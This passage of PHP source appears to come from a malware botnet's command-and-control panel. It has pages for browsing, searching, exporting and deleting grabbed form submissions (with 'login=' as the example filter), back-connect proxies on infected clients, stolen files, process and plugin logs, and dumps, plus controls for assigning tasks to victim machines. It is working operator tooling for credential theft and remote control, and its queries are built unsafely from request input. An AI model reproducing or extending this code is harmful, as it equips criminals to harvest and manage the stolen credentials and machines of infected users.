                        echo '<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAQCAMAAACC7snvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkNCRTQ0RDcwMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkNCRTQ0RDcxMzlFODExRTRBM0VGODQ2NjQ4M0ZCNDdGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6Q0JFNDRENkUzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6Q0JFNDRENkYzOUU4MTFFNEEzRUY4NDY2NDgzRkI0N0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz41c02nAAAAWlBMVEX///9JAgJvBQV8AgV9Bwd/BAqBAAPVBxfYAhHmAhTmGCXnBhj/AR3/ASD/AiH/BSH/BSX/DCf/DST/Eir/GCb/Giz/ICj/IC3/KCv/KC//LjH/U1P/X1////9Eo2rSAAAAAXRSTlMAQObYZgAAAQNJREFUOMutU9uOgyAUPN6qiMULIGvX8/+/uXNQk6bS7oMlw2SYzJnAA0SUl+VlEFa+rr+XkUnP4+dxGWtJ5TIvX0BO1ccA8yKb/62qKA9hfgue25ZDWzP4QwyoqArOexc2QG/YHdbBsXae66DfZaLj8TRnvZjeRo4Qh5mtA/m4NYuGE49H5mmqoMLaKQGetGbLNVjrGkU66t0/51E0TqOgfwKOrMdexoX7ketDy73EeZ1CUT8MCSA8cLPxMKCgOZxG6+acR1GyZxtXG6NWHTpyIl/QzXQmBbzAYBxCdQY3OXT0z3ncKN1jjFLIy4jCUYF3Hf1TviDK7t39MjL5/rcvLKI/xWJOTGTVfyAAAAAASUVORK5CYII=" title="Last access: ' . $row['client_date'] . '"></td>';
                    }

                    $client_info = !empty($row['client_comment']) ? $row['client_comment'] : 'Add comment';
                    echo '<td>' . urldecode($row['client_life_time']) . '</td>' .
                        '<td style="text-align: center;vertical-align:middle;">' .
                        '<a href = "?act=tasks&csrf=' . $_SESSION['csrf'] . '&client_id=' . $row['client_id'] . '" title="Add a task to the client"><span class="glyphicon glyphicon-plus-sign"></a>&nbsp;' .
                        '<a href = "?act=clients&csrf=' . $_SESSION['csrf'] . '&client_id=' . $row['client_id'] . '&action=delete" title="Remove client from database"><span class="glyphicon glyphicon-minus-sign"></a>&nbsp;' .
                        '<a data-toggle="modal" data-target="#add-comment-' . $i . '" href="#" title="' . $client_info . '"><span class="glyphicon glyphicon-comment"></a>&nbsp;' .
                        //'<a href = "?act=info&client_id=' . $row['client_id'] . '&csrf=' . $_SESSION['csrf'] . '" title="Show additional information (New tab)" target=_blank><span class="glyphicon glyphicon-info-sign"></a>' .
                        '</td></tr>';
                }
            }
            echo '</tbody></table>';
            GetPagination($page, $str, $count_pages);
            ?>
        </div>
    </div>
    <?php

}
if ($_act === 'grabber') {

    $client_form_hash = array_key_exists('client_form_hash', $_GET) ? $mysqli->real_escape_string($_GET['client_form_hash']) : '';

    $start_date = array_key_exists('dp1', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['dp1'])) : 0;
    $end_date = array_key_exists('dp2', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['dp2'])) : 0;

    $show_by_link = array_key_exists('show_by_link', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['show_by_link'])) : 0;
    $show_by_data = array_key_exists('show_by_data', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['show_by_data'])) : 0;
    $show_by_ip = array_key_exists('show_by_ip', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['show_by_ip'])) : 0;
    $show_by_id = array_key_exists('show_by_id', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['show_by_id'])) : 0;
    $by_extra_data = array_key_exists('by_extra_data', $_GET) ? htmlspecialchars($mysqli->escape_string($_GET['by_extra_data'])) : 0;

    $is_search = array_key_exists('search', $_GET) ? 1 : 0;
    $current_page = array_key_exists('page', $_GET) ? (int)htmlspecialchars($_GET['page']) : 0;

    $link_download_grabber_logs = '?' . htmlspecialchars($_SERVER['QUERY_STRING'], ENT_QUOTES, "utf-8") . '&mode=download&csrf=' . $_SESSION['csrf'];
    $link_delete_filter_grabber_logs = '?' . htmlspecialchars($_SERVER['QUERY_STRING'], ENT_QUOTES, "utf-8") . '&mode=delete_by_filter&csrf=' . $_SESSION['csrf'];
    $link_delete_all_grabber_logs = '?' . htmlspecialchars($_SERVER['QUERY_STRING'], ENT_QUOTES, "utf-8") . '&mode=delete_all&csrf=' . $_SESSION['csrf'];

    $sql = 'SELECT * FROM ' . DB_GRABBER . '';
    if ($start_date) {
        $sql .= " WHERE client_date BETWEEN STR_TO_DATE('" . $start_date . "','%Y-%m-%d')";
    }
    if ($end_date) {
        if (strpos($sql, ' WHERE ') === false) {
            $sql .= " WHERE client_date <= ";
        } else {
            $sql .= ' AND ';
        }
        $sql .= "STR_TO_DATE('" . addslashes($end_date) . "','%Y-%m-%d')";
    }
    if ($start_date && !$end_date) {
        $sql .= " AND STR_TO_DATE('" . date('Y-m-d') . "','%Y-%m-%d')";
    }
    if ($show_by_link) {
        if (strpos($sql, ' WHERE ') === false) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "FROM_BASE64(client_host) like '%" . urldecode($show_by_link) . "%'";
    }
    if ($show_by_data) {
        if (strpos($sql, ' WHERE ') === false) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }

        $sql .= "FROM_BASE64(client_form) like '%" . urldecode($show_by_data) . "%'";
    }
    if ($show_by_ip) {
        if (strpos($sql, ' WHERE ') === false) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_ip like '%" . $show_by_ip . "%'";
    }
    if ($show_by_id) {
        if (strpos($sql, ' WHERE ') === false) {
            $sql .= ' WHERE ';
        } else {
            $sql .= ' AND ';
        }
        $sql .= "client_id like '%" . addslashes($show_by_id) . "%'";
    }
    if ($by_extra_data) {

        if ($by_extra_data != 'ALL') {
            if (strpos($sql, ' WHERE ') === false) {
                $sql .= ' WHERE ';
            } else {
                $sql .= ' AND ';
            }
            $sql .= "client_form_extra = '" . $by_extra_data . "'";
        }
    }

    if (array_key_exists('delete_record', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {
        $delete_record = $mysqli->real_escape_string($_GET['delete_record']);
        QueryRedirect($mysqli, 'DELETE FROM ' . DB_GRABBER . ' WHERE client_form_hash = "' . $delete_record . '"', PAGE_GRABBER);
    }

    if (array_key_exists('mode', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {
        switch ($_GET['mode']) {
            case 'delete_all':
                QueryRedirect($mysqli, 'TRUNCATE TABLE ' . DB_GRABBER . '', PAGE_GRABBER);
                break;

            case 'delete_by_filter':
                $sql_delete = str_replace('SELECT *', 'DELETE', $sql);
                QueryRedirect($mysqli, $sql_delete, PAGE_GRABBER);
                break;

            case 'download':
                ExportGrabberLogs($mysqli, $sql);
                break;

            case 'reset':
                MessageRedirect(PAGE_GRABBER);
                break;

            default:
                break;
        }
    }

    $logs_count = $mysqli->query($sql)->num_rows;
    $count_pages = floor($logs_count / PAGE_LIMIT);

    if ($current_page) {
        $sql .= ' LIMIT ' . floor($current_page * PAGE_LIMIT) . ', ' . PAGE_LIMIT . '';
    } else {
        $sql .= ' LIMIT 0, ' . PAGE_LIMIT . '';
    }

    $_str = null;
    $_query_str = explode('&', $_SERVER['QUERY_STRING']);

    foreach ($_query_str as $s_str) {
        if (strpos($s_str, 'page') !== false) {
            break;
        } else {
            $_str .= htmlspecialchars($s_str) . '&';
        }
    }

    $start_page = abs($current_page * PAGE_LIMIT);
    $res = $mysqli->query($sql);
    ?>

<div class="panel panel-primary" style="margin: 0 auto;">
    <div class="panel-heading">
        <b>Grabber<i> (<?php echo $logs_count ?>) </i></b>
    </div>
    <div class="modal fade" id="advanced-search">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                    <h4 class="modal-title">Advanced search</h4>
                </div>
                <form method="GET" action="">
                    <input type="hidden" name="act" value="grabber">
                    <div class="input-group input-group-sm">
                        <span class="input-group-addon">  Start search from date :</span>
                        <input type="text" class="form-control " style="width: 50%" id="dp1" name="dp1"
                            <?php if ($start_date) {
                                echo "value =\"" . $start_date . "\"";
                            } ?>>
                        <input type="text" class="form-control" style="width: 50%" id="dp2" name="dp2"
                            <?php if ($end_date) {
                                echo "value =\"" . $end_date . "\"";
                            } ?>>
                    </div>

                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By link :</span>
                        <input class="form-control" type="text" name="show_by_link" placeholder="example.com"
                            <?php if ($show_by_link) {
                                echo "value =\"" . $show_by_link . "\"";
                            } ?>>
                    </div>
                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By form data :</span>
                        <input class="form-control" type="text" name="show_by_data" placeholder="login="
                            <?php if ($show_by_data) {
                                echo "value =\"" . $show_by_data . "\"";
                            } ?>>
                    </div>
                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By client ip :</span>
                        <input class="form-control" type="text" name="show_by_ip"
                            <?php if ($show_by_ip) {
                                echo "value =\"" . $show_by_ip . "\"";
                            } ?>>
                    </div>
                    <div class="input-group input-group-sm" style="width: 100%">
                        <span class="input-group-addon">By client id :</span>
                        <input class="form-control" type="text" name="show_by_id"
                            <?php if ($show_by_id) {
                                echo "value =\"" . $show_by_id . "\"";
                            } ?>>
                    </div>

                    <div class="input-group input-group-sm">
                        <span class="input-group-addon">By 'extra' data :&nbsp;&nbsp;&nbsp;</span>
                        <select class="form-control" name="by_extra_data" style="width: 100%">
                            <?php
                            $query = $mysqli->query('SELECT client_form_extra, COUNT(*) AS counter FROM ' . DB_GRABBER . ' GROUP BY client_form_extra');
                            echo '<option value="ALL">ALL</option>';
                            while ($row = $query->fetch_array()) {
                                echo '<option value="' . $row['client_form_extra'] . '"> ' . urldecode($row['client_form_extra']) . ' (' . $row['counter'] . ')' . '</option>';
                            }
                            ?>
                        </select>
                    </div>
                    <br>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary btn-ok" name="search">Search</button>
                        <button type="submit" class="btn btn-default" name="mode" value="reset">Reset search</button>
                        <button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
                    </div>
                    <input type="hidden" name="csrf" value="<?php echo $_SESSION['csrf'] ?>">
                </form>
            </div>
        </div>
    </div>
    <ul class="nav nav-tabs">
        <form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="GET" class="navbar-form navbar-right"
              role="search">
            <input type="hidden" name="act" value="grabber">
            <div class="form-group form-group-sm">
                <?php echo '<input type="text" class="form-control" name="show_by_link" placeholder="Search by link" value="';
                if (array_key_exists('show_by_link', $_GET)) {
                    echo $show_by_link;
                }
                echo '"/>';
                ?>
            </div>

            <button type="submit" name="search" class="btn btn-default btn-sm">Search</button>
            <?php
            if ($is_search) {
                echo '<button type="submit" class="btn btn-warning btn-sm" name="mode" value="reset">Reset</button>';
            }
            ?>
            <div class="btn-group">
                <a href="#" class="btn btn-default btn-sm" data-toggle="dropdown">
                    Menu
                    <span class="caret"></span>
                </a>
                <ul style="z-index: 999;" class="dropdown-menu">
                    <li><a data-toggle="modal" data-target="#advanced-search" href="#"><span
                                class="glyphicon glyphicon-search"></span> Advanced search</a></li>
                    <li role="separator" class="divider"></li>
                    <li>
                        <a href="<?php echo $link_download_grabber_logs; ?>"><span
                                class="glyphicon glyphicon-floppy-saved"></span> Download logs by current filter</a>
                    </li>
                    <li><a href="#"
                           onclick="ConfirmDelete('<?php echo $link_delete_filter_grabber_logs; ?>'); return false;"><span
                                class="glyphicon glyphicon-floppy-remove"></span> Delete logs by current filter</a>
                    </li>
                    <li role="separator" class="divider"></li>
                    <li><a href="#"
                           onclick="ConfirmDelete('<?php echo $link_delete_all_grabber_logs; ?>'); return false;"><span
                                class="glyphicon glyphicon-floppy-remove"></span> Delete all logs</a>
                    </li>
                </ul>
            </div>
            <input type="hidden" name="csrf" value="<?php echo $_SESSION['csrf'] ?>">
        </form>
    </ul>
    <?php

    if ($res && $res->num_rows != 0) {
        echo '<div id="wrapper">'
            . '<table style="font-size:9pt;" id="example" class="table table-responsive table-condensed table-hover">'
            . '<th><b>IP</th>'
            . '<th><b>ID</th>'
            . '<th><b>Host</th>'
            . '<th><b>Request</th>'
            . '<th><b>Browser</th>'
            . '<th><b>Date \ Time</th>'
            . '<th><b>Details</th>'
            . '<tbody>';

        for ($i = 0; $i < $res->num_rows; $i++) {

            $row = $res->fetch_assoc();
            $client_link = base64_decode($row['client_host']);
            $client_form = str_replace('&', PHP_EOL, base64_decode($row['client_form']));

            echo '<div class="modal fade" id="show-details-' . $i . '">'
                . '<div class="modal-dialog">'
                . '<div class="modal-content">'
                . '<div class="modal-header">'
                . '<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>'
                . '<h4 class="modal-title">Request details ( <i>' . $client_link . '</i> )</h4>'
                . '</div>'
                . '<form method="GET" action="">'
                . '<input type="hidden" name="act" value="grabber">'
                . '<textarea style="width:100%;resize: none;" rows="10" cols="45">'
                . urldecode($client_form)
                . '</textarea>'
                . '<div class="modal-footer">'
                . '<button type="submit" class="btn btn-danger btn-sm btn-ok" name="delete_record" value="' . $row['client_form_hash'] . '">Delete record</button>'
                . '<button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Cancel</button>'
                . '<input name="csrf" type="hidden" value="' . $_SESSION['csrf'] . '">'
                . '</div>'
                . '</form>'
                . '</div>'
                . '</div>'
                . '</div>';

            if (strpos($client_link, 'http://') === false and strpos($client_link, 'https://') === false) {
                $client_link = 'https://' . $client_link;
            }

            echo '<tr>'
                . '<td><b> ' . $row['client_ip'] . '</td>'
                . '<td><a href = "?act=grabber&show_by_id=' . $row['client_id'] . '&search"title="Show by ID">' . $row['client_id'] . '</a></td>'
                . '<td><b><a href = "?act=grabber&show_by_link=' . base64_decode($row["client_host"]) . '&search"title="Search by link">' . my_substr($client_link, 60) . '</a> <a target="_blank" href = "' . "./redirect.php?url=" . $client_link . '" title="Open \'' . $client_link . '\' (Secure link)"><span style="text-align: center;vertical-align:middle;"  class="glyphicon glyphicon-share-alt"></span></a></td>'
                . '<td>'
                . my_substr((htmlspecialchars($client_form)), 50)
                . '</td>'
                . '<td><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NUM4NjA2NjM4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NUM4NjA2NjQ4OTYxMTFFNEIwMDREN0MzODg1MDNCMUUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1Qzg2MDY2MTg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1Qzg2MDY2Mjg5NjExMUU0QjAwNEQ3QzM4ODUwM0IxRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==" class="' . strtolower($row['client_browser']) . '" title="' . $row['client_browser'] . '"</td>'
                . '<td>' . $row['client_date'] . '</td>'
                . '<td><button data-toggle="modal" data-target="#show-details-' . $i . '" type="button" class="btn btn-primary btn-xs">Details</button></td>'
                . '</tr>';

            $start_page++;
        }
        echo '<tbody></table></div>';
        GetPagination($current_page, $_str, $count_pages);
    }
    echo '</div>';
}
if ($_act === 'proxy') {

    $sql = 'SELECT * FROM ' . DB_PROXY . '';
    $page = array_key_exists('page', $_GET) ? htmlspecialchars($_GET['page']) : 0;

    $proxy_list_link = $_main_url . 'proxy.php?authkey=' . $key_tologin;
    $proxy_list_text = 'Direct link to proxy list:<br> <a href=' . $proxy_list_link . ' target=_blank>' . $proxy_list_link . '</a>';
    $proxy_delete = array_key_exists('client_hash', $_GET) ? $mysqli->real_escape_string($_GET['client_hash']) : null;
    $delete_all_proxies = PAGE_PROXY . '&mode=delete_all&csrf=' . $_SESSION['csrf'];

    $is_search = array_key_exists('search_by_ip', $_GET) ? htmlentities($_GET['search_by_ip']) : null;
    if ($is_search) {
        $sql .= ' WHERE client_ip LIKE "%' . $is_search . '%"';
    }

    if (array_key_exists('mode', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {
        switch ($_GET['mode']) {
            case 'delete':
                QueryRedirect($mysqli, 'DELETE FROM ' . DB_PROXY . ' WHERE client_hash="' . $proxy_delete . '"', PAGE_PROXY);
                break;
            case 'delete_all':
                QueryRedirect($mysqli, 'truncate table ' . DB_PROXY . '', PAGE_PROXY);
                break;
            case 'reset':
                echo '<script>location="' . PAGE_PROXY . '";</script>';
                break;
            default:
                break;
        }
    }

    $proxies_count = $mysqli->query($sql)->num_rows;
    $count_pages = floor($proxies_count / PAGE_LIMIT);
    if ($page) {
        $sql .= ' LIMIT ' . floor($page * PAGE_LIMIT) . ', ' . PAGE_LIMIT . '';
    } else
        $sql .= ' LIMIT 0, ' . PAGE_LIMIT . '';

    $qstring = $_SERVER['QUERY_STRING'];
    $q_str = explode("&", $qstring);
    $str = '';

    foreach ($q_str as $s_str) {
        if (strstr($s_str, "page"))
            break;
        else
            $str .= htmlspecialchars($s_str) . "&";
    }
    ?>

    <div class="panel panel-primary" style="width: 90%;margin: 0 auto;overflow: hidden;">
    <div class="panel-heading"><b>Proxy list (<?php echo $proxies_count; ?>)</b></div>
    <form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="GET" class="navbar-form navbar-right"
          role="search" style="margin-right: 1px;">
        <input type="hidden" name="act" value="proxy">
        <div class="form-group form-group-sm">
            <input class="form-control" name="search_by_ip" placeholder="Search by client ip" type="text"
                   value="<?php echo $is_search; ?>">
        </div>
        <button type="submit" class="btn btn-default btn-sm">Search</button>
        <?php
        if ($is_search) {
            echo '<button type="submit" class="btn btn-warning btn-sm" name="mode" value="reset">Reset</button>';
        }
        ?>
        <div class="btn-group">
            <a href="#" class="btn btn-default btn-sm" data-toggle="dropdown">
                Menu
                <span class="caret"></span>
            </a>
            <ul style="z-index: 999;" class="dropdown-menu">
                <li>
                    <a href="#" onclick="Alert('<?php echo $proxy_list_text; ?>'); return false;">
                        <span class="glyphicon glyphicon-floppy-saved"></span> Get ip:port list</a>
                </li>
                <li role="separator" class="divider"></li>
                <li>
                    <a href="#" onclick="ConfirmDelete('<?php echo $delete_all_proxies; ?>'); return false;">
                        <span class="glyphicon glyphicon-floppy-remove"></span> Delete all proxies</a>
                </li>
            </ul>
        </div>
        <input type="hidden" name="csrf" value="<?php echo $_SESSION['csrf'] ?>">
    </form>
    <div class="panel-body">
    <?php
    echo '<table class="table table-condensed table-hove">'
        . '<th>#</th>'
        . '<th><b>ID</th>'
        . '<th><b>Client IP</th>'
        . '<th><b>Proxy:port</th>'
        . '<th><b>Country</th>'
        . '<th><b>Join date</th>'
        . '<th style="text-align: center"><b>Action</th>';

    $res = $mysqli->query($sql);
    if ($res->num_rows != 0) {
        for ($i = 0; $i < $res->num_rows; $i++) {
            $row = $res->fetch_assoc();
            echo '<tbody><tr>'
                . '<td style="width=5%"><b>' . $i . '<b></td>'
                . '<td style="width=5%"><a href = "?act=grabber&show_by_id=' . $row['client_id'] . '" title="Show client logs">' . $row['client_id'] . '</td>'
                . '<td style="width=5%">' . $row['client_ip'] . '</td>'
                . '<td style="width=55%">' . $row['client_bc_ip'] . ":" . $row['client_bc_port'] . '</td>'
                . '<td style="vertical-align: middle;">' . ShowFlag($row['client_country'], $country_array[$row['client_country']]) . '&nbsp;' . $country_array[$row['client_country']] . '(' . $row['client_country'] . ')' . '</td>'
                . '<td style="width=10%">' . $row['client_date'] . '</td>'
                . '<td style="width=5%;text-align: center"><a href="' . PAGE_PROXY . '&client_hash=' . $row['client_hash'] . '&mode=delete&csrf=' . $_SESSION['csrf'] . '" title="Delete"><span class="glyphicon glyphicon-remove"></span></a></td></tr>';
        }
        echo '<tbody></table>';
        GetPagination($page, $str, $count_pages);
        echo '</div></div>';
    }
}
if ($_act === 'logs') {

    $file_count = $mysqli->query('SELECT * FROM ' . DB_FILES . ';')->num_rows;
    $process_count = $mysqli->query('SELECT * FROM ' . DB_LOGS . ';')->num_rows;
    $plugin_count = $mysqli->query('SELECT * FROM ' . DB_PLUGIN . ';')->num_rows;

    $is_search = array_key_exists('search', $_GET) ? $mysqli->escape_string(urldecode($_GET['search'])) : null;
    $action = array_key_exists('form', $_GET) ? htmlentities($mysqli->escape_string($_GET['form'])) : null;
    $current_tab = isset($_REQUEST['do']) ? htmlentities($mysqli->escape_string($_REQUEST['do'])) : 'files';

    $client_file_hash = array_key_exists('client_file_hash', $_GET) ? htmlentities($mysqli->escape_string($_GET['client_file_hash'])) : null;
    $client_event_hash = array_key_exists('client_event_hash', $_GET) ? htmlentities($mysqli->escape_string($_GET['client_event_hash'])) : null;

    echo '<div class="panel panel-primary" style="margin: 0 auto;overflow: hidden">'
        . '<div class="panel-heading"><b>Files & Logs</b></div>'
        . '<div class="panel-body">';
    ?>

    <ul class="nav nav-tabs">
        <li><a href="?act=logs&do=files">Filelist <span class="badge"><?php echo $file_count; ?></span></a></li>
        <li><a href="?act=logs&do=process">Process list <span class="badge"><?php echo $process_count; ?></span></a>
        </li>
        <li><a href="?act=logs&do=plugin">Plugin logs <span class="badge"><?php echo $plugin_count; ?></span></a></li>
        <form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="get" class="navbar-form navbar-right"
              role="search">
            <input type="hidden" name="act" value="logs">
            <input type="hidden" name="do" value="<?php echo $current_tab; ?>">

            <div class="form-group form-group-sm">
                <input class="form-control" name="search" placeholder="Search" type="text"
                       value="<?php echo $is_search; ?>">
            </div>


            <button type="submit" class="btn btn-default btn-sm">Search</button>
            <?php
            if ($is_search) {
                echo '<button type="submit" class="btn btn-warning btn-sm" name="form" value="reset">Reset</button>';
            }
            ?>
            <div class="btn-group">
                <a href="#" class="btn btn-default btn-sm dropdown-toggle" data-toggle="dropdown">
                    Menu
                    <span class="caret"></span>
                </a>
                <ul class="dropdown-menu">
                    <li><a href="#"
                           onclick="ConfirmDelete('?act=logs&do=<?php echo $current_tab; ?>&form=download'); return false;">
                            <span class="glyphicon glyphicon-floppy-saved"></span> Save all <?php echo $current_tab; ?>
                        </a></li>
                    <li>
                        <a href="#"
                           onclick="ConfirmDelete('?act=logs&do=<?php echo $current_tab; ?>&form=deleteall'); return false;">
                            <span class="glyphicon glyphicon-floppy-remove"></span> Delete
                            all <?php echo $current_tab; ?></a>
                    </li>
                </ul>
            </div>
        </form>
    </ul>
    </div>
    <?php
    switch ($action) {
        case 'delete':
            if ($_do == null || $_do == 'files') {
                unlink('./files/' . $file_hash);
                QueryRedirect($mysqli, 'DELETE FROM ' . DB_FILES . ' WHERE client_file_hash= \'' . $client_file_hash . '\'', PAGE_LOGS);
            } else if ($_do == 'process') {
                QueryRedirect($mysqli, 'DELETE FROM ' . DB_LOGS . ' WHERE client_event_hash= \'' . $client_event_hash . '\'', PAGE_PROCESS);
            } else if ($_do == 'plugin') {
                QueryRedirect($mysqli, 'DELETE FROM ' . DB_PLUGIN . ' WHERE client_event_hash= \'' . $client_event_hash . '\'', PAGE_PLUGIN);
            }
            break;
        case 'deleteall':
            if ($_do == 'plugin') {
                QueryRedirect($mysqli, 'truncate ' . DB_PLUGIN . '', PAGE_PLUGIN);
            } else if ($_do == 'process') {
                QueryRedirect($mysqli, 'truncate ' . DB_LOGS . '', PAGE_PROCESS);
            } else if ($_do == 'files') {
                DeleteAll('files');
                QueryRedirect($mysqli, 'truncate ' . DB_FILES . '', PAGE_LOGS);
            }
            break;
        case 'reset': {
            echo $_do;
            break;
        }

        case 'download':
            if ($_do == 'files') {
                $archive_name = 'files_(' . date('Y-m-d_H-i-s') . ').zip';
                if (zip_sql('./files/', './upload/' . $archive_name, $mysqli, DB_FILES)) {
                    echo '<script>ReloadPage("<b>Export succesfully!</b>' . '<br>' . 'File moved to \'Upload\', filename - ' . $archive_name . '", "' . PAGE_LOGS . '");</script>';
                }
            } else if ($_do == 'process') {
                $archive_name = 'process_(' . date('Y-m-d_H-i-s') . ').zip';
                ExportLogs($mysqli);
            } else if ($_do == 'plugin') {
                $archive_name = 'plugin_(' . date('Y-m-d_H-i-s') . ').zip';
                ExportPlugin($mysqli);
            }
            break;
    }
    switch ($_do) {
        case 'process':
            ParseDb($mysqli, 'SELECT * FROM ' . DB_LOGS . '', 'process');
            break;

        case 'plugin':
            ParseDb($mysqli, 'SELECT * FROM ' . DB_PLUGIN . '', 'plugin');
            break;

        default:
            ParseFiles($mysqli, 'files');
            break;
    }
    echo '</div>';
}
if ($_act === 'dumps') {

    $sql = 'SELECT * FROM ' . DB_DUMPS . '';

    $dumps_count = $mysqli->query($sql)->num_rows;
    $pages_count = floor($dumps_count / PAGE_LIMIT);

    $current_page = array_key_exists('page', $_GET) ? (int)htmlspecialchars($_GET['page']) : 0;
    $current_track_hash = array_key_exists('track_hash', $_GET) ? $mysqli->escape_string($_GET['track_hash']) : null;

    $is_search = array_key_exists('search_by_data', $_GET) ? htmlentities($_GET['search_by_data']) : null;
    if ($is_search) {
        $sql .= ' WHERE FROM_BASE64(client_data) LIKE "%' . $is_search . '%"';
    }

    $link_download_dumps = '?' . htmlspecialchars($_SERVER['QUERY_STRING'], ENT_QUOTES, 'utf-8') . '&mode=download&csrf=' . $_SESSION['csrf'];
    $link_delete_dumps = '?' . htmlspecialchars($_SERVER['QUERY_STRING'], ENT_QUOTES, 'utf-8') . '&mode=deleteall&csrf=' . $_SESSION['csrf'];

    if (array_key_exists('mode', $_GET) && $_SESSION['csrf'] == $_GET['csrf']) {
        switch ($_GET['mode']) {
            case 'search': {
                break;
            }
            case 'reset': {
                echo '<script>location="' . PAGE_DUMPS . '";</script>';
                break;
            }
            case 'download': {
                ExportDumps($mysqli);
                break;
            }
            case 'delete': {
